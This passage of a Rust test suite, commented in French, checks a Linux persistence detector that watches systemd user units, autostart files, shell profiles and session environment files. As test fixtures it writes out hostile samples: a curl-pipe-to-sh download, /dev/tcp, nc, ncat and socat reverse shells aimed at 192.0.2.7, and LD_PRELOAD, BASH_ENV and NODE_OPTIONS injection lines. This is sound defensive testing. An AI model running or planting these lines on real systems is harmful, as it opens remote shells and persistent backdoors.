            Maison { racine }
        }

        fn chemin(&self, relatif: &str) -> std::path::PathBuf {
            self.racine.join("home/alice").join(relatif)
        }

        fn ecrire(&self, relatif: &str, texte: &str) {
            let p = self.chemin(relatif);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            let _ = std::fs::remove_file(&p);
            std::fs::write(p, texte).unwrap();
        }

        fn lancements(&self) -> Constat {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            )
            .into_iter()
            .next()
            .unwrap()
        }
    }

    impl Drop for Maison {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.racine);
        }
    }

    const UNITE: &str = "[Unit]\nDescription=Rappel\n\n[Service]\nType=oneshot\nExecStart=%h/.cache-x/rappel.sh\n";

    fn maison_avec_rappel(nom: &str) -> Maison {
        let m = Maison::nouvelle(nom);
        m.ecrire(".config/systemd/user/rappel.service", UNITE);
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        m
    }

    /// Le cas qui a mené à ce lot (valeurs inventées) : une unité de l'utilisateur lance un programme d'un dossier
    /// caché, à corriger soi-même. Elle se déclare normale, montre sa ligne, son fichier et le programme lancé ; le
    /// même état relu au bilan suivant est tu.
    #[test]
    fn unite_de_l_utilisateur_declarable() {
        use crate::machine::temoins::Temoins;
        let m = maison_avec_rappel("declarable");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        let k = c.correctif.as_ref().unwrap();
        assert!(!k.automatique, "une ligne du dossier personnel reste à la main");
        let Temoins::Releves(_) = c.temoins() else {
            panic!("{:?}", c.temoins());
        };
        let lignes = c.temoins().lignes();
        assert_eq!(lignes.len(), 1);
        assert_eq!(lignes[0].ou, "~/.config/systemd/user/rappel.service:6");
        assert_eq!(lignes[0].ligne, "ExecStart=%h/.cache-x/rappel.sh");
        assert!(lignes[0].contenant.is_some());
        assert_eq!(lignes[0].cibles.len(), 2);
        assert_eq!(lignes[0].cibles[0].chemin, "~/.cache-x/rappel.sh");
        assert_eq!(
            lignes[0].cibles[1].chemin, ENVIRONNEMENT,
            "l'environnement des sessions est lié"
        );
        assert!(crate::apprentissage::declarable(&c).is_ok());
        let encore = m.lancements();
        assert_eq!(c.temoins().empreinte(), encore.temoins().empreinte());
        assert!(crate::apprentissage::essai_tait(&c, &encore));
    }

    /// Le modèle de menace du lot, cas par cas : après un choix « normal », chaque changement fait revenir l'alerte.
    #[test]
    fn tout_changement_fait_revenir_l_alerte() {
        type Changement = fn(&Maison);
        let cas: [(&str, Changement); 26] = [
            ("unité changée", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}Environment=LANG=C\n"),
                );
            }),
            ("unité remplacée par un lien au même contenu", |m| {
                m.ecrire(".local/share/ailleurs.service", UNITE);
                let p = m.chemin(".config/systemd/user/rappel.service");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".local/share/ailleurs.service"), &p).unwrap();
            }),
            ("programme lancé changé", |m| {
                m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl -s http://192.0.2.7/x | sh\n");
            }),
            ("programme lancé remplacé par un lien", |m| {
                m.ecrire(".cache-x/vrai.sh", "#!/bin/sh\necho rappel\n");
                let p = m.chemin(".cache-x/rappel.sh");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".cache-x/vrai.sh"), &p).unwrap();
            }),
            ("programme lancé effacé", |m| {
                std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
            }),
            ("ligne ajoutée dans le même fichier", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}ExecStartPost=%h/.cache-x/autre.sh\n"),
                );
            }),
            ("autre source dans la même alerte", |m| {
                m.ecrire(".config/autostart/maj.desktop", "[Desktop Entry]\nExec=/tmp/.x/agent\n");
            }),
            ("ligne de la crontab dans un fichier lu", |m| {
                m.ecrire(".bashrc", "export LD_PRELOAD=/tmp/.l/libz.so\n");
            }),
            ("ajout (drop-in) posé", |m| {
                m.ecrire(".config/systemd/user/rappel.service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout de tous les services posé", |m| {
                m.ecrire(".config/systemd/user/service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout posé dans le dossier de la session", |m| {
                let d = m.racine.join("run/user/1000/systemd/user/rappel.service.d");
                std::fs::create_dir_all(&d).unwrap();
                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            ("même ligne, autre programme", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &UNITE.replace("rappel.sh", "rappel.sh --x"),
                );
            }),
            // Campagne E, F4 : une variable posée pour les sessions change ce que fait la ligne sans toucher à un
            // fichier lié.
            ("variable dans environment.d", |m| {
                m.ecrire(
                    ".config/environment.d/50-x.conf",
                    "BASH_ENV=/home/alice/.cache-x/e.sh
",
                );
            }),
            ("variable par défaut du gestionnaire", |m| {
                m.ecrire(
                    ".config/systemd/user.conf.d/x.conf",
                    "[Manager]\nDefaultEnvironment=PYTHONPATH=/home/alice/.cache-x\n",
                );
            }),
            ("variable de Hyprland", |m| {
                m.ecrire(
                    ".config/hypr/hyprland.conf",
                    "env = NODE_OPTIONS,--require=/home/alice/.e.js\n",
                );
            }),
            ("variable d'un profil", |m| {
                m.ecrire(".profile", "export PS4='$(id)'\n");
            }),
            ("variable de pam_env", |m| {
                m.ecrire(".pam_environment", "PYTHONSTARTUP DEFAULT=/home/alice/.e.py\n");
            }),
            // F5 : un alias de l'unité et son ajout, dans le dossier de la session.
            ("ajout posé sous un alias", |m| {
                let d = m.racine.join("run/user/1000/systemd/user");
                std::fs::create_dir_all(d.join("alias.service.d")).unwrap();
                std::os::unix::fs::symlink(m.chemin(".config/systemd/user/rappel.service"), d.join("alias.service"))
                    .unwrap();
                std::fs::write(d.join("alias.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // M-d : le dossier d'exécution de systemd pour les unités de l'utilisateur.
            ("ajout posé dans /run/systemd/user", |m| {
                let d = m.racine.join("run/systemd/user/rappel.service.d");
                std::fs::create_dir_all(&d).unwrap();
                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // M-c : execr-once d'Hyprland.
            ("execr-once d'Hyprland", |m| {
                m.ecrire(".config/hypr/autostart.conf", "execr-once = /tmp/.x/agent\n");
            }),
            // Vérification de la campagne E, N6 : un alias d'alias, nommé par des liens relatifs, et son ajout.
            ("ajout posé sous un alias d'alias", |m| {
                let d = m.racine.join("run/user/1000/systemd/user");
                std::fs::create_dir_all(d.join("alias2.service.d")).unwrap();
                std::os::unix::fs::symlink("rappel.service", d.join("alias.service")).unwrap();
                std::os::unix::fs::symlink("alias.service", d.join("alias2.service")).unwrap();
                std::fs::write(d.join("alias2.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // N3 : les fichiers des variables liés en entier, ceux que lisent bash, zsh et fish compris.
            ("commentaire d'un profil", |m| m.ecrire(".bashrc", "# note\n")),
            ("bash_login", |m| m.ecrire(".bash_login", "export GTK_MODULES=x\n")),
            ("zlogin", |m| m.ecrire(".zlogin", "export GTK_MODULES=x\n")),
            ("configuration de fish", |m| {
                m.ecrire(".config/fish/conf.d/x.fish", "set -gx GTK_MODULES x\n");
            }),
            ("variable de Hyprland par un autre dossier", |m| {
                m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/v.conf\n");
                m.ecrire(".autres/v.conf", "env = GTK_MODULES,x\n");
            }),
        ];
        for (nom, changer) in cas {
            let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{nom}");
            changer(&m);
            let plus_tard = m.lancements();
            assert!(plus_tard.probleme >= Some(Niveau::Eleve), "{nom}");
            assert_ne!(declare.temoins().empreinte(), plus_tard.temoins().empreinte(), "{nom}");
            assert!(
                !crate::apprentissage::essai_tait(&declare, &plus_tard),
                "{nom} : l'alerte doit revenir"
            );
        }
    }

    /// Ce qui ne se relève pas ne se déclare pas normal : une commande ambiguë, un programme illisible, plus de
    /// lignes qu'on n'en montre ; un shell inversé non plus. Et une alerte qui ne se relève plus n'est plus tue.
    #[test]
    fn releves_refuses() {
        use crate::machine::temoins::{TEMOINS_MAX, Temoins};
        let refuse = |m: &Maison| matches!(m.lancements().temoins(), Temoins::Refuse(_));
        let m = Maison::nouvelle("ambigu");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/run $ARGUMENTS\n",
        );
        assert!(refuse(&m));
        assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        let m = Maison::nouvelle("inverse");
        m.ecrire(".bashrc", "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1\n");
        assert!(refuse(&m));
        let m = Maison::nouvelle("trop");
        let unite = (0..=TEMOINS_MAX).fold(String::new(), |mut u, i| {
            u.push_str("ExecStartPre=%h/.x/etape");
            u.push_str(&i.to_string());
            u.push('\n');
            u
        });
        m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{unite}"));
        assert!(refuse(&m));
        // Le programme devenu illisible (un dossier à sa place) : le choix d'hier ne tait plus rien.
        let m = maison_avec_rappel("illisible");
        let declare = m.lancements();
        std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
        std::fs::create_dir_all(m.chemin(".cache-x/rappel.sh")).unwrap();
        let plus_tard = m.lancements();
        assert!(matches!(plus_tard.temoins(), Temoins::Refuse(_)));
        assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard));
    }

    /// Le refus d'une alerte, tel qu'il se montre.
    /// Campagne E, F1 : un octet qui n'est pas de l'UTF-8 dans un fichier de démarrage ou d'environnement : la
    /// ligne ne se déclare pas (lue « avec pertes », elle montrerait et suivrait un autre fichier que celui lancé).
    #[test]
    fn octet_illisible_jamais_declarable() {
        let sources: [(&str, &[u8]); 5] = [
            (
                ".config/systemd/user/rappel.service",
                b"[Service]\nExecStart=%h/.cache-x/rap\xffpel.sh\n",
            ),
            (
                ".config/autostart/maj.desktop",
                b"[Desktop Entry]\nExec=/tmp/.x/ag\xffent\n",
            ),
            (".config/hypr/autostart.conf", b"exec-once = /tmp/.x/ag\xffent\n"),
            (".bashrc", b"export LD_PRELOAD=/tmp/.l/li\xffbz.so\n"),
            (".config/environment.d/50-x.conf", b"LANG=fr\xff\n"),
        ];
        for (i, (fichier, octets)) in sources.into_iter().enumerate() {
            let m = maison_avec_rappel(&format!("octet-{i}"));
            let p = m.chemin(fichier);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, octets).unwrap();
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{fichier}");
            assert!(crate::apprentissage::declarable(&c).is_err(), "{fichier}");
        }
    }

    /// Les variables des sessions liées en entier (vérification de la campagne E, N3) : tout changement d'un de
    /// leurs fichiers, même un commentaire, fait revenir l'alerte ; plus de liste de noms à contourner.
    #[test]
    fn variables_des_sessions_liees_en_entier() {
        for (i, (fichier, texte)) in [
            (".config/environment.d/50-x.conf", "# note\n"),
            (".config/environment.d/50-x.conf", "GTK_MODULES=/tmp/x\n"),
            (".config/environment.d/50-x.conf", "PYTHON\\x5fPATH=/x\n"),
            (".pam_environment", "GDK_PIXBUF_MODULE_FILE DEFAULT=/tmp/x\n"),
            (
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=BASH_FUNC_x%%=()\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("variables-{i}"));
            let declare = m.lancements();
            m.ecrire(fichier, texte);
            assert!(
                !crate::apprentissage::essai_tait(&declare, &m.lancements()),
                "{fichier} {texte:?}"
            );
        }
    }

    /// Campagne E, M-f : un dossier personnel relatif ne passe jamais pour « rien de suspect ».
    #[test]
    fn dossier_personnel_relatif_dit() {
        let m = maison_avec_rappel("relatif");
        let c = persistance_dans(&m.racine, Path::new("maison"), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(
            c.message.contains("dossier personnel inconnu ou relatif"),
            "{}",
            c.message
        );
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Vérification de la campagne E, N3 : un fichier que lit un fichier des variables (« source = » de Hyprland,
    /// « . » d'un profil) est lié aussi ; un « source = » calculé de Hyprland ne se suit pas, et rien ne se déclare.
    #[test]
    fn sources_des_variables_suivies() {
        for (i, (fichier, texte, lu)) in [
            (
                ".config/hypr/hyprland.conf",
                "source = ~/.autres/v.conf\n",
                ".autres/v.conf",
            ),
            (
                ".config/hypr/hyprland.conf",
                "source=/home/alice/.autres/v.conf # x\n",
                ".autres/v.conf",
            ),
            (".profile", ". ~/.autres/p.sh\n", ".autres/p.sh"),
            (".bashrc", "source \"$HOME/.autres/p.sh\"\n", ".autres/p.sh"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("sources-{i}"));
            m.ecrire(fichier, texte);
            m.ecrire(lu, "# rien\n");
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
            m.ecrire(lu, "# autre chose\n");
            assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
        }
        for (i, texte) in [
            "source = $HOME/x.conf\n",
            "source = ~/.*/v.conf\n",
            "source = ~/.autres/{a,b}.conf\n",
            "source = autres.conf\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("sources-calculees-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte}");
            assert!(refus(&c).contains("toutes lettres"), "{texte} : {}", refus(&c));
        }
        // Un profil qui se lit lui-même : la chaîne s'arrête, rien ne tourne sans fin.
        let m = maison_avec_rappel("sources-boucle");
        m.ecrire(".profile", ". ~/.profile\n");
        assert!(crate::apprentissage::essai_tait(&m.lancements(), &m.lancements()));
    }

    /// Vérification de la campagne E, « -mmodule » : un interpréteur du système copié sous un autre nom lit ce que ses
    /// options lui donnent, que rien ne lie ; la ligne ne se déclare pas. Un autre programme de même taille, si.
    #[test]
    fn copie_d_un_interprete_refusee() {
        let m = Maison::nouvelle("copie");
        let bin = m.racine.join("usr/bin");
        std::fs::create_dir_all(&bin).unwrap();
        std::fs::write(bin.join("python3"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/outil -mrappel\n",
        );
        std::fs::create_dir_all(m.chemin(".x")).unwrap();
        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
        let c = m.lancements();
        assert!(crate::apprentissage::declarable(&c).is_err());
        assert!(refus(&c).contains("copie de /usr/bin/python3"), "{}", refus(&c));
        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 autre-prog").unwrap();
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
        // Un lien dur, même sans lire le contenu.
        std::fs::remove_file(m.chemin(".x/outil")).unwrap();
        if std::fs::hard_link(bin.join("python3"), m.chemin(".x/outil")).is_ok() {
            assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        }
        // Deuxième vérification : un interpréteur de même taille qui ne se relit pas ne fait pas conclure « pas une
        // copie ».
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::remove_file(m.chemin(".x/outil")).unwrap();
            std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 autre-prog").unwrap();
            std::fs::write(bin.join("python3"), b"\x7fELF\x02\x01\x01\x00\x00 interpret2").unwrap();
            std::fs::set_permissions(bin.join("python3"), std::fs::Permissions::from_mode(0o000)).unwrap();
            if std::fs::read(bin.join("python3")).is_ok() {
                return crate::essais::saute("le compte lit un fichier sans droit de lecture (root)");
            }
            let c = m.lancements();
            std::fs::set_permissions(bin.join("python3"), std::fs::Permissions::from_mode(0o644)).unwrap();
            assert!(refus(&c).contains("ne se compare pas"), "{}", refus(&c));
        }
    }

    /// Vérification de la campagne E, N7 : une unité posée sous un XDG_CONFIG_HOME ou un XDG_DATA_HOME déplacé est
    /// cherchée comme les autres (systemd l'y lit), et ne passe pas pour « rien de suspect ».
    #[test]
    fn unites_des_dossiers_deplaces_vues() {
        for (variable, dossier) in [("XDG_CONFIG_HOME", "systemd/user"), ("XDG_DATA_HOME", "systemd/user")] {
            let m = Maison::nouvelle(&format!("deplace-{}", variable.len() + dossier.len()));
            let ailleurs = m.racine.join("ailleurs");
            let vars = |v: &str| match v {
                "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
                x if x == variable => Some("/ailleurs".into()),
                _ => None,
            };
            let lire = || {
                persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
                    .into_iter()
                    .next()
                    .unwrap()
            };
            assert_eq!(lire().probleme, None, "{variable}");
            std::fs::create_dir_all(ailleurs.join(dossier)).unwrap();
            std::fs::write(ailleurs.join(dossier).join("rappel.service"), UNITE).unwrap();
            m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
            assert!(lire().probleme >= Some(Niveau::Eleve), "{variable}");
        }
        // Le dossier de démarrage du bureau d'une configuration déplacée aussi.
        let m = Maison::nouvelle("deplace-bureau");
        let vars = |v: &str| (v == "XDG_CONFIG_HOME").then(|| "/ailleurs".into());
        std::fs::create_dir_all(m.racine.join("ailleurs/autostart")).unwrap();
        std::fs::write(
            m.racine.join("ailleurs/autostart/maj.desktop"),
            "[Desktop Entry]\nExec=/tmp/.x/agent\n",
        )
        .unwrap();
        let c = persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve));
    }

    /// Vérification de la campagne E, N9 : un dossier personnel que le compte ne peut pas lire n'est pas « rien de
    /// suspect », mais « non vérifié ».
    #[cfg(unix)]
    #[test]
    fn dossier_personnel_illisible_dit() {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle("illisible-maison");
        let maison = m.chemin("");
        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o000)).unwrap();
        if std::fs::read_dir(&maison).is_ok() {
            std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root)");
        }
        let c = m.lancements();
        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(c.message.contains("dossier personnel ne se lit pas"), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Campagne E, M-d : un XDG_CONFIG_HOME déplacé est lu, ses unités et ses variables comprises.
    #[test]
    fn configuration_deplacee_lue() {
        let m = maison_avec_rappel("deplacee");
        let ailleurs = m.racine.join("ailleurs");
        let vars = |v: &str| match v {
            "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
            "XDG_CONFIG_HOME" => Some("/ailleurs".into()),
            _ => None,
        };
        let lire = || {
            persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
                .into_iter()
                .next()
                .unwrap()
        };
        let declare = lire();
        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
        std::fs::create_dir_all(ailleurs.join("systemd/user/rappel.service.d")).unwrap();
        std::fs::write(
            ailleurs.join("systemd/user/rappel.service.d/x.conf"),
            "[Service]\nNice=5\n",
        )
        .unwrap();
        assert!(
            !crate::apprentissage::essai_tait(&declare, &lire()),
            "ajout sous XDG_CONFIG_HOME"
        );
        std::fs::remove_dir_all(ailleurs.join("systemd")).unwrap();
        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
        std::fs::create_dir_all(ailleurs.join("environment.d")).unwrap();
        std::fs::write(ailleurs.join("environment.d/x.conf"), "NODE_OPTIONS=--require=/x.js\n").unwrap();
        assert!(
            !crate::apprentissage::essai_tait(&declare, &lire()),
            "variable sous XDG_CONFIG_HOME"
        );
    }

    fn refus(c: &Constat) -> String {
        match c.temoins() {
            crate::machine::temoins::Temoins::Refuse(r) => r.clone(),
            autre => panic!("refus attendu : {autre:?}"),
        }
    }

    /// Relecture E, C2 : ce qui redirige une ligne acceptée sans toucher aux fichiers liés ne se déclare pas normal ;
    /// un ajout (drop-in) qui change le dossier personnel, les bibliothèques ou les variables, une unité du même nom
    /// qui passe avant, même écrit sur des lignes continuées.
    #[test]
    fn unite_redirigee_refusee() {
        let cas: [(&str, &str, &str); 10] = [
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=HOME=/tmp/h\n",
                "HOME",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironmentFile=%h/.e\n",
                "EnvironmentFile",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=\"LANG=C\" \\\n  LD_PRELOAD=/tmp/l.so\n",
                "LD_PRELOAD",
            ),
            (
                "service.d/x.conf",
                "[Service]\nEnvironment=PYTHONPATH=/tmp\n",
                "PYTHONPATH",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nExecSearchPath=/tmp\n",
                "ExecSearchPath",
            ),
            // Vérification de la campagne E, N1 : le dossier de travail change ce que lit « /proc/self/cwd/… » et
            // tout chemin relatif d'un programme.
            (
                "rappel.service.d/x.conf",
                "[Service]\nWorkingDirectory=/tmp\n",
                "WorkingDirectory",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nRootDirectory=/tmp\n",
                "RootDirectory",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nTemporaryFileSystem=/opt\n",
                "TemporaryFileSystem",
            ),
            ("../user.control/rappel.service", UNITE, "user.control"),
            // Campagne E : l'entrée standard d'un service peut porter le script que lit un interpréteur.
            (
                "rappel.service.d/x.conf",
                "[Service]\nStandardInputText=curl http://192.0.2.7/x\n",
                "StandardInput",
            ),
        ];
        for (fichier, texte, attendu) in cas {
            let m = maison_avec_rappel(&format!("redirigee-{attendu}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok(), "{attendu}");
            m.ecrire(&format!(".config/systemd/user/{fichier}"), texte);
            let plus_tard = m.lancements();
            assert!(refus(&plus_tard).contains(attendu), "{attendu} : {}", refus(&plus_tard));
            assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard), "{attendu}");
        }
        // Sans dossier de la session, ce que systemd y ajouterait ne se vérifie pas.
        let m = maison_avec_rappel("sans-session");
        let c = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(refus(&c).contains("XDG_RUNTIME_DIR"));
    }

    /// Relecture E, C7 : un shell inversé se lit sans ambiguïté, mais ne se déclare jamais normal.
    #[test]
    fn porte_derobee_jamais_declarable() {
        for ligne in [
            "ExecStart=/usr/bin/nc -e /bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/ncat --sh-exec=/bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/socat TCP:192.0.2.7:4444 EXEC:/bin/sh",
        ] {
            let m = Maison::nouvelle(&format!("porte-{}", ligne.len()));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{ligne}\n"));
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{ligne}");
            assert!(refus(&c).contains("porte dérobée"), "{ligne} : {}", refus(&c));
        }
    }

    /// Relecture E, B2 : « bash script » lie le script, pas seulement bash ; M3 : une ligne Lua qui colle autre chose
    /// à la commande ne se déclare pas ; M9 : une unité qui n'est pas de l'UTF-8 se lit quand même.
    #[test]
    fn scripts_lua_et_octets() {
        let m = Maison::nouvelle("script");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nExecStart=/usr/bin/bash %h/.cache-x/rappel.sh\n",
        );
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "le script caché est signalé");
        let lignes = c.temoins().lignes();
        let chemins: Vec<&str> = lignes[0].cibles.iter().map(|c| c.chemin.as_str()).collect();
        assert_eq!(chemins, ["/usr/bin/bash", "~/.cache-x/rappel.sh", ENVIRONNEMENT]);
        assert!(lignes[0].cibles[1].apercu.is_some(), "le script se montre");
        let declare = c;
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl http://192.0.2.7/x\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));

        let m = Maison::nouvelle("lua");
        m.ecrire(
            ".config/hypr/autostart.lua",
            "o.exec_on_start(\"/tmp/x/run\" .. suffixe)\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(refus(&c).contains("ambiguïté"), "{}", refus(&c));
        m.ecrire(".config/hypr/autostart.lua", "o.exec_on_start(\"/tmp/x/run\")\n");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());

        let m = Maison::nouvelle("octets");
        let p = m.chemin(".config/systemd/user/a.service");
        std::fs::write(&p, b"[Unit]\nDescription=caf\xe9\n[Service]\nExecStart=/tmp/.x/a\n").unwrap();
        assert_eq!(m.lancements().probleme, Some(Niveau::Eleve));
    }

    /// M9 : un tube nommé à la place d'un fichier lu est dit, jamais compté comme sain (ni attendu : il bloquerait).
    #[test]
    fn tube_a_la_place_d_un_fichier() {
        let m = Maison::nouvelle("tube");
        let p = m.chemin(".bashrc");
        if !std::process::Command::new("mkfifo")
            .arg(&p)
            .status()
            .is_ok_and(|s| s.success())
        {
            return crate::essais::saute("mkfifo absent");
        }
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(c.message.contains("non vérifié"), "{}", c.message);
    }

    /// M7 : un service système ajouté à la main lie ce qu'il lance ; changé, son information revient.
    #[test]
    fn service_ajoute_lie_son_programme() {
        let m = Maison::nouvelle("service");
        let unite = m.racine.join("etc/systemd/system/sauvegarde.service");
        std::fs::create_dir_all(unite.parent().unwrap()).unwrap();
        std::fs::write(&unite, "[Service]\nExecStart=/opt/sauvegarde/lancer --nuit\n").unwrap();
        let programme = m.racine.join("opt/sauvegarde/lancer");
        std::fs::create_dir_all(programme.parent().unwrap()).unwrap();
        std::fs::write(&programme, "#!/bin/sh\nrestic backup\n").unwrap();
        let mut r = Releveur {
            racine: m.racine.clone(),
            maison: m.chemin(""),
            ..Releveur::default()
        };
        assert!(
            temoin_de_service(&mut r, &unite).is_err(),
            "sans l'environnement relevé, rien ne se lie"
        );
        r.environnement = Some(environnement(&r, Vec::new(), Vec::new()));
        let avant = temoin_de_service(&mut r, &unite).unwrap();
        assert_eq!(avant.cibles.len(), 2);
        assert_eq!(avant.cibles[1].chemin, ENVIRONNEMENT);
        assert_eq!(avant.cibles[0].chemin, "/opt/sauvegarde/lancer");
        std::fs::write(&programme, "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        let apres = temoin_de_service(&mut r, &unite).unwrap();
        assert_ne!(avant.trace, apres.trace);
    }

    /// Les dossiers d'ajout d'une unité, comme les cherche systemd.
    #[test]
    fn noms_des_ajouts() {
        assert_eq!(
            ajouts_de("a-b-c.service"),
            ["a-.service.d", "a-b-.service.d", "a-b-c.service.d", "service.d"]
        );
        assert_eq!(ajouts_de("x@1.service"), ["service.d", "x@.service.d", "x@1.service.d"]);
        assert!(directive_refusee("[Service]\nEnvironment=LANG=C TZ=UTC\n").is_none());
        assert!(directive_refusee("# EnvironmentFile=/x\n").is_none());
        assert_eq!(
            directive_refusee("[Service]\nEnvironment='LANG=1' \\\n# note\n  \"PATH=/tmp\"\n").as_deref(),
            Some("Environment=PATH")
        );
        // Vérification de la campagne E, N3 : systemd enlève les guillemets et décode « \xNN » avant de lire le
        // nom ; seule une courte liste de noms connus passe, et une barre oblique inversée n'est jamais lue.
        for (texte, attendu) in [
            ("[Service]\nEnvironment=PYTHON\\x5fPATH=/tmp\n", "Environment=\\…"),
            (
                "[Service]\nEnvironment=\"LANG=C\" \"PYTHON\"PATH=/tmp\n",
                "Environment=PYTHONPATH",
            ),
            (
                "[Service]\nEnvironment=\"LD_PRE\"LOAD=/tmp/a.so\n",
                "Environment=LD_PRELOAD",
            ),
            ("[Service]\nEnvironment=GTK_MODULES=x\n", "Environment=GTK_MODULES"),
            ("[Service]\nEnvironment=\"LANG=C\n", "Environment"),
            (
                "[Service]\nPassEnvironment=BASH_FUNC_x%%\n",
                "PassEnvironment=BASH_FUNC_x%%",
            ),
            ("[Service]\nWorkingDirectory=/tmp\n", "WorkingDirectory"),
        ] {
            let vu = directive_refusee(texte);
            assert!(
                vu.as_deref().is_some_and(|v| v.starts_with(attendu)),
                "{texte:?} : {vu:?}"
            );
        }
        assert!(directive_refusee("[Service]\nEnvironment=\"LANG=C\" LC_ALL=C TZ=UTC NO_COLOR=1\n").is_none());
    }

    /// Le témoin d'environnement d'une ligne déclarable, tel qu'il se montre.
    fn apercu_de_l_environnement(c: &Constat) -> Vec<String> {
        let t = c.temoins();
        let ligne = t.lignes().into_iter().next().expect("une ligne relevée");
        ligne
            .cibles
            .iter()
            .find(|x| x.chemin == ENVIRONNEMENT)
            .and_then(|x| x.apercu.clone())
            .expect("l'environnement se montre")
    }

    /// Deuxième vérification de la campagne E, P2 : chaque ligne Exec de l'unité est montrée et liée avec la ligne
